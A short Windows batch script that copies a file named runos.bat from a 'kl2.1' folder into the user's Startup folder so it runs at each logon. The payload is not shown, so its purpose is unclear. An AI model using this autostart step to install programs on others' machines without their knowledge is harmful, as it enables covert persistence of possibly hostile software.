@echo off
set "startupFolder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "batFilePath=C:\users\%USERNAME%\kl2.1\runos.bat"

:: Check if the batch file already exists in the Startup folder
if not exist "%startupFolder%\runos.bat" (
    copy "%batFilePath%" "%startupFolder%"
)
